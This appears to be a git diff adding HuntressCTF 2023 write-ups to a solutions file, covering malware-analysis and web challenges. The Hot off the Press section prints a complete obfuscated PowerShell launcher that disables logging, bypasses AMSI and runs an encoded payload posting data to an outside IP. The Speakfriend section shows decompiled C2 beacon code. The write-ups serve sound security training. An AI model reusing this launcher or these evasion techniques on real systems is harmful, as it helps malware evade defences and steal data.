@@ -18,8 +18,11 @@ Here are my solutions for the challenges I solved as a part of HuntressCTF 2023.
 - [[Malware] BlackCat (Easy)](#blackcat)
 - [[Malware] PHP Stager (Easy)](#php-stager)
 - [[Malware] VeeBeeEee (Easy)](#veebeeeee)
-- [[Malware] OpenDir (Easy)](#opendir)
-- [[Malware] Operation Eradication (Easy)](#operation-eradication)
+- [[Malware] OpenDir (Medium)](#opendir)
+- [[Malware] Snake Oil (Medium)](#snake-oil)
+- [[Malware] Operation Eradication (Medium)](#operation-eradication)
+- [[Malware] Speakfriend (Medium)](#speakfriend)
+- [[Malware] Hot off the Press (Medium)](#hot-off-the-press)
 - [[OSINT] Under The Bridge (Medium)](#under-the-bridge)
 - [[OSINT] Operation Not Found (Medium)](#operation-not-found)
 - [[OSINT] Where am I? (Medium)](#where-am-i)
@@ -29,6 +32,7 @@ Here are my solutions for the challenges I solved as a part of HuntressCTF 2023.
 - [[M365] The President (Easy)](#m365-the-president)
 - [[Misc] PRESS PLAY ON TAPE (Easy)](#press-play-on-tape)
 - [[Misc] Welcome to the Park (Easy)](#welcome-to-the-park)
+- [[Misc] Indirect Payload (Medium)](#indirect-payload)
 - [[Stego] Land Before Time (Easy)](#land-before-time)
 
 ## F12
@@ -296,7 +300,7 @@ The domain `sketchysite.github.io` resolved to the following addresses:
 I visited this site and it had the flag listed:
 
 ```
-flag{}
+flag{8626fe7dcd8d412a80d0b3f0e36afd4a}
 ```
 
 ## Rogue Inbox 
@@ -803,6 +807,27 @@ grep: ./sir/LPE/InstallerFileTakeOver.exe: binary file matches
 ./sir/64_bit_new/oui.txt:flag{9eb4ebf423b4e5b2a88aa92b0578cbd9}
 ```
 
+## Snake Oil
+This was some sort of compiled Python malware. I decided to approach it dynamically first, and when I ran it through command prompt I saw this:
+
+```
+>snake-oil.exe
+Downloading ngrok ...
+```
+
+Ngrok is a networking utility that I have seen leveraged before during some IR engagements by attackers to establish reverse proxies to compromised systems. Since the program was supposedly installing ngrok, I wanted to see if it was also configuring it as well. I ran `Process Monitor` and did some filtering, where I saw this entry:
+
+```
+snake-oil.exe CreateFile C:\Users\REM\.ngrok2\ngrok.yml SUCCESS
+```
+
+The contents of that file were the flag:
+
+```
+authtoken: flag{d7267ce26203b5cc69f4bab679cc78d2}
+
+```
+
 ## Operation Eradication
 This challenge launches a web instance and also has a file containing this:
 
@@ -847,6 +872,177 @@ When I revisited the challenge instance website, it presented the flag:
 
 ```
 flag{564607375b731174f2c08c5bf16e82b4}
+```
+
+## Speakfriend
+This challenge had to do with a binary that was communicating to a website that was likely compromised and was being used to host a C2 server. Typically, you have to send the C2 server the right HTTP request to get into the C2 functionality, which is otherwise hidden behind a legitimate-looking site.
+
+I decided to do this one statically. I used Ghidra and the main function looked promising. I did some cleanup with renaming/retyping variables, and setting some equates:
+
+```
+undefined8 main(int param_1,long param_2)
+
+{
+  int iVar1;
+  char *port;
+  size_t post_options_length;
+  long curl_handle;
+  long in_FS_OFFSET;
+  int i;
+  char embedded_post_options [48];
+  char post_options [112];
+  char url_and_port [264];
+  long local_20;
+  char char_tmp;
+  undefined8 url;
+  
+  local_20 = *(in_FS_OFFSET + 0x28);
+  if ((1 < param_1) && (param_1 < 4)) {
+    url = *(param_2 + 8);
+    if (param_1 == 3) {
+      port = *(param_2 + 0x10);
+    }
+    else {
+      port = "443";
+    }
+    embedded_post_options._0_8_ = 0x2f616c6c697a6f4d;
+    embedded_post_options._8_8_ = 0x6562333920302e35;
+    embedded_post_options._16_8_ = 0x3762372d62353464;
+    embedded_post_options._24_8_ = 0x392d373930342d30;
+    embedded_post_options._32_8_ = 0x346138392d393732;
+    embedded_post_options._40_8_ = 0x6533353330666561;
+    post_options[0] = '\0';
+    for (i = 0; i < 0x30; i = i + 1) {
+      char_tmp = embedded_post_options[i];
+      post_options_length = strlen(post_options);
+      sprintf(post_options + post_options_length,"%c",char_tmp);
+    }
+    curl_global_init(3);
+    do {
+      curl_handle = curl_easy_init();
+      if (curl_handle != 0) {
+        iVar1 = strcmp(port,"443");
+        if (iVar1 == 0) {
+          curl_easy_setopt(curl_handle,CURLOPT_URL,url);
+        }
+        else {
+          snprintf(url_and_port,0x100,"%s:%s",url,port);
+          curl_easy_setopt(curl_handle,CURLOPT_URL,url_and_port);
+        }
+        curl_easy_setopt(curl_handle,CURLOPT_USERAGENT,post_options);
+        curl_easy_setopt(curl_handle,CURLOPT_WRITEFUNCTION,write_callback);
+        curl_easy_setopt(curl_handle,CURLOPT_VERBOSE,3);
+        curl_easy_setopt(curl_handle,CURLOPT_HEADER,0);
+        curl_easy_setopt(curl_handle,CURLOPT_NOPROGRESS,0);
+        curl_easy_setopt(curl_handle,CURLOPT_SSL_VERIFYPEER,1);
+        curl_easy_perform(curl_handle);
+        curl_easy_cleanup(curl_handle);
+      }
+      sleep(0x1e);
+    } while( true );
+  }
+  if (*(in_FS_OFFSET + 0x28) != *(in_FS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return 1;
+}
+```
+
+The documentation that I used to translate between a value of `0x2722` and its enumerated value of `CURLOPT_USERAGENT` can be found [here](https://github.com/curl/curl/blob/c0d4fbb1f5e64581813e8c8dbfd8e8b8d0a47483/packages/OS400/curl.inc.in).
+
+Basically, what this program is doing is sending a GET request to a parameter-provided URL/port and setting the HTTP User-Agent to the following:
+
+```
+Mozilla/5.0 93bed45b-7b70-4097-9279-98a4aef0353e
+```
+
+I ran this myself with curl:
+
+```
+$ curl -I "https://chal.ctf.games:32538" -k  -A "Mozilla/5.0 93bed45b-7b70-4097-9279-98a4aef0353e" -i
+HTTP/1.1 302 FOUND
+Server: gunicorn
+Date: Sat, 28 Oct 2023 23:58:05 GMT
+Connection: keep-alive
+Content-Type: text/html; charset=utf-8
+Content-Length: 267
+Location: /93bed45b-7b70-4097-9279-98a4aef0353e/c2
+Access-Control-Allow-Origin: *
+```
+
+It was nice enough to tell me where the C2 was! The flag was at that directory:
+
+```
+$ curl "https://chal.ctf.games:32538/93bed45b-7b70-4097-9279-98a4aef0353e/c2" -k  -A "Mozilla/5.0 93bed45b-7b70-4097-9279-98a4aef0353e" -i
+HTTP/1.1 200 OK
+Server: gunicorn
+Date: Sat, 28 Oct 2023 23:58:16 GMT
+Connection: keep-alive
+Content-Type: text/html; charset=utf-8
+Content-Length: 39
+Access-Control-Allow-Origin: *
+
+flag{3f2567475c6def39501bab2865aeba60}
+```
+
+## Thumb Drive
+This challenge downloads a Windows `.lnk` file. Inside this file is a URL:
+```
+https://tinyurl[.]com/a7ba6ma
+```
+
+The URL shortener resolves to a Google Doc with a large amount of Base32 encoded data. Decoded, it is actually a PE, more specifically a DLL. It exports two functions:
+```
+_DLLMain@12
+_MessageBoxThread@4
+```
+
+I ran the DLL with `rundll32.exe`, targeting the `_MessageBoxThread@4` export, using the following command:
+```
+rundll32.exe download.dll,#2
+```
+
+This spawned a MessageBox with the flag:
+```
+flag{0af2873a74cfa957ccb90cef814cfe3d}
+```
+
+## Hot off the Press
+This challenge downloaded a UHA archive. I had to download a special program just to extract is as 7-Zip doesn't support this archive format. 
+
+Once extracted, it presents a heavily obfuscated PowerShell program:
+
+```
+C:\Windows\SysWOW64\cmd.exe /c powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b=$env:windir+'\sysnative\WindowsPowerShell\v1.0\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c $x_wa3=((''Sc''+''{2}i''+''pt{1}loc{0}Logg''+''in''+''g'')-f''k'',''B'',''r'');If($PSVersionTable.PSVersion.Major -ge 3){ $sw=((''E''+''nable{3}''+''c{''+''1}''+''ip{0}Bloc{2}Logging''+'''')-f''t'',''r'',''k'',''S''); $p8=[Collections.Generic.Dictionary[string,System.Object]]::new(); $gG0=((''Ena''+''ble{2}c{5}i{3}t{''+''4}loc''+''{0}{1}''+''nv''+''o''+''cationLoggi''+''ng'')-f''k'',''I'',''S'',''p'',''B'',''r''); $jXZ4D=[Ref].Assembly.GetType(((''{0}y''+''s''+''tem.{1}a''+''n''+''a{4}ement.A{5}t''+''omati''+''on.{2''+''}ti{3}s'')-f''S'',''M'',''U'',''l'',''g'',''u'')); $plhF=[Ref].Assembly.GetType(((''{''+''6}{''+''5}stem.''+''{''+''3''+''}{9}''+''n{9}{''+''2}ement''+''.{''+''8}{''+''4}t{''+''7''+''}''+''m{9}ti{7}n''+''.''+''{8''+''}''+''m''+''si{0''+''}ti{''+''1}s'')-f''U'',''l'',''g'',''M'',''u'',''y'',''S'',''o'',''A'',''a'')); if ($plhF) { $plhF.GetField(((''''+''a{''+''0}''+''si{4}''+''nit{''+''1}''+''ai''+''l{2}{''+''3}'')-f''m'',''F'',''e'',''d'',''I''),''NonPublic,Static'').SetValue($null,$true); }; $lCj=$jXZ4D.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($lCj) { $a938=$lCj.GetValue($null); If($a938[$x_wa3]){ $a938[$x_wa3][$sw]=0; $a938[$x_wa3][$gG0]=0; } $p8.Add($gG0,0); $p8.Add($sw,0); $a938[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$x_wa3]=$p8; } Else { [Ref].Assembly.GetType(((''S{2}{3}''+''t''+''em''+''.Mana''+''ge''+''ment.{''+''5}{4}to''+''mation.Scr''+''ipt{1}loc{0}'')-f''k'',''B'',''y'',''s'',''u'',''A'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sI''+''AIeJ''+''G2UC/+1X''+''bU/jOBD+3l9hrS''+''IlkU{0}''+''VFvb{1}IiFdWqD''+''bPRJKS8vR''+''brUKy''+''TR168TFcQplb//7''+''jfNSygJ73{1}lI94F''+''IVvwyMx4/M''+''7YfT9PYl5TH''+''hH7sku8VUnxd''+''T3gRMTT/ku''+''/fWUSjS3Mzp''+''oX7zCWHxBjby+UR''+''jzwaTw4OWq''+''kQ{1}M''+''u8XW2''+''DtJM{1}''+''omtGI''+''TFM8he5nIGAnbP''+''rOfiSf''+''Cfat2qb8W''+''uPFW{0}rlufP''+''gOzYcaD''+''GTrnvKbeq/''+''SWj0tC/ftXN8U5''+''9Uj2+ST2''+''WGHp/nUiIqgFjuk''+''l+mGrCi/USDN2''+''hvuAJn8rqJY''+''13G9VBn''+''HhTcNHa''+''ChyQMx4''+''kul''+''nZ{0}{1}a''+''AT{1}Wcr0kZyUUMHa''+''tdwX0''+''7CAQkiW6RsTI''+''/nkx+N8bF''+''3{0}00''+''ljS''+''CaieWIPiyD''+''2JFfUiq''+''n704YNC''+''D6QS1+l{0}Q''+''OJyYJoq''+''t+AIM{0}U4Zs8''+''i/MWO4c''+''Fsi91olY1sJpbpS''+''mBYG''+''9Jl1OjxIG''+''eSa+jOO''+''5kl''+''g4pcngl''+''n5UalMy7''+''yJvPq''+''3o6eZs2mX''+''3zgbAHTX6PK''+''{1}Zr''+''qHp''+''GYRBy''+''f2JBdrbGoXIgVz''+''sgGbaNGe/Yf''+''1SmP1UhP1V''+''u0U''+''e8ZDToP''+''JRn0r''+''7tr0pj38q{1}''+''ReTuIjmNI''+''YjtaxF1G/''+''zFPjuWjAl{1}{1}GR''+''7UUc9{1}9Qy8''+''GIDgCB''+''q{1}nFb4qKZ6oHU''+''dUbnSbKWUB''+''CNvHiCb''+''oFQbbfO''+''xMHjJD78QORAhd3''+''sYs''+''1aa4O6''+''CU{0}nb''+''{1}upxdtVFIbz{1}v''+''SSzSTXF7+hbpg8c''+''gsIgdJ7QYs''+''lPJs6r+4K6T''+''Mkl9{0}5Glu''+''Yn5{1}5zFtC''+''0eJ1KkPgYVIbj''+''o{0}8''+''GnHlOIWO''+''QzDaC57''+''tOwnF5/Fo+Wxx''+''juG7S0wnhgj8''+''Kh{0}1Wq''+''CPQ0Swuz2g''+''fZiZYMIpTJjosT5''+''oV4''+''OBS7I''+''8st{0}4RAf8HRc''+''hPkGa+Q''+''KSHZchP''+''D3WdcWmRIhcTDR6''+''GM2fVfnHhy''+''6uTOtAQ''+''UwTGyvTVur''+''qXKfi0+P''+''W8sVI4WAGVwCI''+''lQn''+''AgeNb0{1}ftv{0}Dxjj''+''Q6dlh+/lvbyX''+''9/K/{0}22X+XG''+''vHr''+''RZ0mnV635''+''0N7''+''+6d''+''Pmob8sR''+''bf{0}gc+/2j''+''O6vT''+''ufHt856786''+''dO6lz{1}e5i''+''e302D2/PjuxV''+''tzFMr''+''xqfFqP{0}3nQU3''+''c1G''+''9zXmzq+''+''YGzn4P8b''+''iM7f''+''Rwf85lk''+''4+Nh8w5''+''36Q1Z17P6vn7''+''WP8h1gW2R/n+0''+''m2g8UuZ''+''M{0}M3kN7UYyHh''+''T17M5+aw22''+''ch1+GvZO{0}oc3+bF''+''+FX2jz''+''PmifrIOWvTq''+''nNhse''+''D91Ba+iPwsPD''+''D2ZlPKCx3G1M1{1}W''+''+qwhS''+''RWP+p/''+''2tS+Al6''+''ud4''+''Ipl5DC8H5HTl''+''FX3C''+''xUnB1{0}qcKg3DU''+''{1}x/''+''ASIGhvQYCXR5sd''+''mMcV+RxJzSIUP''+''NeaOisYNO''+''5tVzNZNsBM0''+''H9lh2HRyM''+''0{1}u8{0}{0}O7rH''+''oKcShnVu1ut1ZD''+''7le7q+3htfj6''+''pbX4cm3ktix''+''FHjNwNtZZZt2s''+''0CkxjDfHC9''+''8H{1}unK{0}xB7C''+''Tyce''+''4H0AvlOfukrCJ''+''ucs20A''+''i5Vt8''+''u{1}R''+''fghcHVc/Vq+''+''D{0}FPQxA7''+''c{1}{1}0q/rzFxrX0''+''+uz6TZOnIC8z/AX''+''/mDwPfb8YfVVC1a''+''wcoCfd''+''jzseiN/bIX''+''DpUYmCf''+''aRhDPKHwQtAFB''+''tmK8gqP{0}gbpsWn''+''Hspnq''+''dxx8''+''emlmODf2GZMc5''+''4PA''+''AA='')-f''L'',''E'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"]
+```
+
+It may be hard to tell, but there is Base64 encoding in there, and it is piped into:
+
+```
+&([scriptblock]::create(
+    (New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream(
+        (New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((( ...
+```
+
+I proceeded with extracting just the Base64 content, a truncated example is:
+
+```
+''H4sI''+''AIeJ''+''G2UC/+1X'' .. +''4PA''+''AA='')-f''L'',''E''
+```
+
+The important thing to note here is the presence of the string formatting option `-f`, with the arguments `L,E`. This means, in the string that is passed to it, any `{0}` will be replaced with an `L`, and any `{1}` will be replaced by an `E`. I did this replacement manually, and then also manualy removed the double quotes and plus symbols, specifically, `''+''`. The result was raw Base64 text, which I decoded and ran through Gunzip in [CyberChef](https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Simple%20string','string':'%7B0%7D'%7D,'L',true,false,true,false)Find_/_Replace(%7B'option':'Simple%20string','string':'%7B1%7D'%7D,'E',true,false,true,false)Find_/_Replace(%7B'option':'Simple%20string','string':'%5C'%5C'%2B%5C'%5C''%7D,'',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'%5C'%5C''%7D,'',true,false,true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)Gunzip()&input=JydINHNJJycrJydBSWVKJycrJydHMlVDLysxWCcnKycnYlUvak9CRCszbDloclMnJysnJ0lsa1V7MH0nJysnJ1ZGdmJ7MX1JaUZkV3FEJycrJydiUFJKS1M4dlInJysnJ2JyVUt5JycrJydUUjE2OFRGY1FwbGIvLzcnJysnJ2pmTlN5Z0o3M3sxfWxJOTRGJycrJydJVnZ3eU14NC9NJycrJyc3WWZUOVBZbDVUSCcnKycnaEg3c2t1OFZVbnhkJycrJydUM2dSTVRUL2t1JycrJycvZldVU2pTM016cCcnKycnb1g3ekNXSHhCamJ5K1VSJycrJydqendhVHc0T1dxJycrJydrUXsxfU0nJysnJ3U4WFcyJycrJydEdEpNezF9JycrJydvbXRHSScnKycnVEZNOGhlNW5JR0FuYlAnJysnJ3JPZmlTZicnKycnQ2ZhdDJxYjhXJycrJyd1UEZXezB9cmx1ZlAnJysnJ2dPelljYUQnJysnJ0dUcm52S2JlcS8nJysnJ1NXajB0Qy9mdFhOOFU1JycrJyc5VWoyK1NUMicnKycnV0dIcC9uVWlJcWdGanVrJycrJydsK21HckNpL1VTRE4yJycrJydodnVBSm44cnFKWScnKycnMTNHOVZCbicnKycnSGhUY05IYScnKycnQ2h5UU14NCcnKycna3VsJycrJyduWnswfXsxfWEnJysnJ0FUezF9V2NyMGtaeVVVTUhhJycrJyd0ZHdYMCcnKycnN0NBUWtpVzZSc1RJJycrJycvbmt4K044YkYnJysnJzN7MH0wMCcnKycnbGpTJycrJydDYWllV0lQaXlEJycrJycySkZmVWlxJycrJyduNzA0WU5DJycrJydENlFTMStsezB9UScnKycnT0p5WUpvcScnKycndCtBSU17MH1VNFpzOCcnKycnaS9NV080YycnKycnRnNpOTFvbFkxc0pwYnBTJycrJydtQllHJycrJyc5SmwxT2p4SUcnJysnJ2VTYStqT08nJysnJzVrbCcnKycnZzRwY25nbCcnKycnbjVVYWxNeTcnJysnJ3lKdlBxJycrJyczbzZlWnMybVgnJysnJzN6Z2JBSFRYNlBLJycrJyd7MX1acicnKycncUhwJycrJydHWVJCeScnKycnZjJKQmRyYkdvWElnVnonJysnJ3NnR2JhTkdlL1lmJycrJycxU21QMVVoUDFWJycrJyd1MFUnJysnJ2U4WkRUb1AnJysnJ0pSbjByJycrJyc3dHIwcGozOHF7MX0nJysnJ1JlVHVJam1OSScnKycnWWp0YXhGMUcvJycrJyd6RlBqdVdqQWx7MX17MX1HUicnKycnN1VVYzl7MX05UXk4JycrJydHSURnQ0InJysnJ3F7MX1uRmI0cUtaNm9IVScnKycnZFViblNiS1dVQicnKycnQ052SGlDYicnKycnb0ZRYmJmTycnKycneE1IakpENzhRT1JBaGQzJycrJydzWXMnJysnJzFhYTRPNicnKycnQ1V7MH1uYicnKycnezF9dXB4ZHRWRkliensxfXYnJysnJ1NTelNUWEY3K2hicGc4YycnKycnZ3NJZ2RKN1FZcycnKycnbFBKczZyKzRLNlQnJysnJ01rbDl7MH01R2x1JycrJydZbjV7MX01ekZ0QycnKycnMGVKMUtrUGdZVkliaicnKycnb3swfTgnJysnJ0duSGxPSVdPJycrJydRekRhQzU3JycrJyd0T3duRjUvRm8rV3h4JycrJydqdUc3UzB3bmhnajgnJysnJ0toezB9MVdxJycrJydDUFEwU3d1ejJnJycrJydmWmlaWU1JcFRKam9zVDUnJysnJ29WNCcnKycnT0JTN0knJysnJzhzdHswfTRSQWY4SFJjJycrJydoUGtHYStRJycrJydLU0haY2hQJycrJydEM1dkY1dtUkloY1REUjYnJysnJ0dNMmZWZm5IaHknJysnJzZ1VE90QVEnJysnJ1V3VEd5dlRWdXInJysnJ3FYS2ZpMCtQJycrJydXOHNWSTRXQUdWd0NJJycrJydsUW4nJysnJ0FnZU5iMHsxfWZ0dnswfUR4amonJysnJ1E2ZGxoKy9sdmJ5WCcnKycnOS9LL3swfTIyWCtYRycnKycndkhyJycrJydSWjBtblY2MzUnJysnJzBONycnKycnKzZkJycrJydQbW9iOHNSJycrJydiZnswfWdjKy8yaicnKycnTzZ2VCcnKycndWZIdDg1Njc4NicnKycnZE82bHp7MX1lNWknJysnJ2UzMDJEMi9QanV4VicnKycndHpGTXInJysnJ3hxZkZxUHswfTNuUVUzJycrJydjMUcnJysnJzl6WG16cSsnJysnJ1lHem40UDhiJycrJydpTTdmJycrJydSd2Y4NWxrJycrJyc0K05oOHc1JycrJyczNlExWjE3UDZ2bjcnJysnJ1dQOGgxZ1cyUi9uKzAnJysnJ20yZzhVdVonJysnJ017MH1NM2tON1VZeUhoJycrJydUMTdNNSthdzIyJycrJydjaDErR3ZaT3swfW9jMytiRicnKycnK0ZYMmp6JycrJydQbWlmcklPV3ZUcScnKycnbk5oc2UnJysnJ0Q5MUJhK2lQd3NQRCcnKycnRDJabFBLQ3gzRzFNMXsxfVcnJysnJytxd2hTJycrJydSV1ArcC8nJysnJzJ0UytBbDYnJysnJ3VkNCcnKycnSXBsNURDOEg1SFRsJycrJydGWDNDJycrJyd4VW5CMXswfXFjS2czRFUnJysnJ3sxfXgvJycrJydBU0lHaHZRWUNYUjVzZCcnKycnbU1jVitSeEp6U0lVUCcnKycnTmVhT2lzWU5PJycrJyc1dFZ6TlpOc0JNMCcnKycnSDlsaDJIUnlNJycrJycwezF9dTh7MH17MH1PN3JIJycrJydvS2NTaG5WdTF1dDFaRCcnKycnN2xlN3ErM2h0Zmo2JycrJydwYlg0Y20za3RpeCcnKycnRkhqTndOdFpaWnQycycnKycnMENreGpEZkhDOScnKycnOEh7MX11bkt7MH14QjdDJycrJydUeWNlJycrJyc0SDBBdmxPZnVrckNKJycrJyd1Y3MyMEEnJysnJ2k1VnQ4JycrJyd1ezF9UicnKycnZmdoY0hWYy9WcSsnJysnJ0R7MH1GUFF4QTcnJysnJ2N7MX17MX0wcS9yekZ4clgwJycrJycrdXo2VFpPbklDOHovQVgnJysnJy9tRHdQZmI4WWZWVkMxYScnKycnd2NvQ2ZkJycrJydqenNlaU4vYklYJycrJydEcFVZbUNmJycrJydhUmhEUEtId1F0QUZCJycrJyd0bUs4Z3FQezB9Z2Jwc1duJycrJydIc3BucScnKycnZHh4OCcnKycnZW1sbU9EZjJHWk1jNScnKycnNFBBJycrJydBQT0nJw).
+
+The resulting script block had the following interesting line:
+
+```
+http://.103.163.187.12:8080/?encoded_flag=%66%6c%61%67%7b%64%62%66%65%35%66%37%35%35%61%38%39%38%63%65%35%66%32%30%38%38%62%30%38%39%32%38%35%30%62%66%37%7d
+```
+
+URL decoding this in [CyberChef](https://gchq.github.io/CyberChef/#recipe=URL_Decode()&input=JTY2JTZjJTYxJTY3JTdiJTY0JTYyJTY2JTY1JTM1JTY2JTM3JTM1JTM1JTYxJTM4JTM5JTM4JTYzJTY1JTM1JTY2JTMyJTMwJTM4JTM4JTYyJTMwJTM4JTM5JTMyJTM4JTM1JTMwJTYyJTY2JTM3JTdk): 
+
+```
+flag{dbfe5f755a898ce5f2088b0892850bf7}
 ```
 
 ## Under The Bridge
@@ -971,6 +1167,103 @@ This contained a JPEG image of a person. At the very end of the file was the fla
 
 ```
 flag{680b736565c76941a364775f06383466}
+```
+
+## Indirect Payload
+This was an instance-based challenge. When I visited the web page, there was a button that would take you through a massive amount of redirects. I tried to curl a few separately, and in one instance I saw this happen:
+
+```
+$ curl 'http://chal.ctf.games:30467/site/72deeb2a9ba9fb115580efd7a1bbde41.php' -i
+HTTP/1.1 302 Found
+Date: Sat, 28 Oct 2023 22:26:41 GMT
+Server: Apache/2.4.38 (Debian)
+Location: /site/cd6d46b9bc63ffca46fcea70f76459ea.php
+Content-Length: 32
+Content-Type: text/html; charset=UTF-8
+
+character 9 of the payload is 0
+```
+
+Notice the redirection method is the `HTTP/1.1 302 Found` method. I wanted to see all of the messages regarding the payload so I first told curl to follow all redirects and print out a list of the files it was acessing:
+
+```
+$ curl -s 'http://chal.ctf.games:30467/site/flag.php' -i -L --max-redirs 2600 | grep Location | awk '{print $2}'
+/site/fe3cbf06ef09be78eb8ae144888eeeae.php
+/site/f99cc7e975c1fdfd1b803bd248bac515.php
+/site/0eb108f40ad71158d396d396e825fab7.php
+/site/e318c81f0211a5b17060ddab1fcc8fb0.php
+/site/bdbbadb4fe344b998f98ca54c2e97b01.php
+...
+```
+
+Then I wrote this Bash script to visit all of them:
+
+```
+#!/bin/bash
+input="./files.txt"
+while IFS= read -r line
+do
+  curl -s 'http://chal.ctf.games:30467/site/'$line
+done < "$input"
+```
+
+The `files.txt` file just had a list of all the locations we were redirected to: 
+
+```
+$ cat files.txt 
+fe3cbf06ef09be78eb8ae144888eeeae.php
+f99cc7e975c1fdfd1b803bd248bac515.php
+0eb108f40ad71158d396d396e825fab7.php
+e318c81f0211a5b17060ddab1fcc8fb0.php
+...
+```
+
+Running the script resulted in the flag:
+
+```
+$ ./grab.sh 
+character 0 of the payload is f
+character 1 of the payload is l
+character 2 of the payload is a
+character 3 of the payload is g
+character 4 of the payload is {
+character 5 of the payload is 4
+character 6 of the payload is 4
+character 7 of the payload is 8
+character 8 of the payload is c
+character 9 of the payload is 0
+character 10 of the payload is 5
+character 11 of the payload is a
+character 12 of the payload is b
+character 13 of the payload is 3
+character 14 of the payload is e
+character 15 of the payload is 3
+character 16 of the payload is a
+character 17 of the payload is 7
+character 18 of the payload is d
+character 19 of the payload is 6
+character 20 of the payload is 8
+character 21 of the payload is e
+character 22 of the payload is 3
+character 23 of the payload is 5
+character 24 of the payload is 0
+character 25 of the payload is 9
+character 26 of the payload is e
+character 27 of the payload is b
+character 28 of the payload is 8
+character 29 of the payload is 5
+character 30 of the payload is e
+character 31 of the payload is 8
+character 32 of the payload is 7
+character 33 of the payload is 2
+character 34 of the payload is 0
+character 35 of the payload is 6
+character 36 of the payload is f
+character 37 of the payload is }
+```
+
+```
+flag{448c05ab3e3a7d68e3509eb85e87206f}
 ```
 
 ## Land Before Time
